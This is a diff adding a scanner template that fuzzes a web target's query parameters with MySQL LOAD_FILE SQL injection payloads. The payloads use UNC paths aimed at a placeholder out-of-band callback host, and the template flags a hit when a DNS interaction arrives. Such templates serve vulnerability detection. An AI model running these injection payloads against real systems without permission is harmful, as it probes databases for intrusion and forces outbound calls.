@@ -1,0 +1,29 @@
+id: fuzz-loadfile-oob
+
+info:
+  name: MySQL LOAD_FILE UNC Path OOB
+  author: openai
+  severity: high
+  tags: mysql,lfi,oob,dast
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      loadfile:
+        - "1' AND LOAD_FILE('\\\\{{interactsh-url}}\\\\abc')--"
+        - "1 UNION SELECT LOAD_FILE('\\\\{{interactsh-url}}\\\\')--"
+
+    fuzzing:
+      - part: query
+        mode: single
+        fuzz:
+          - "{{loadfile}}"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
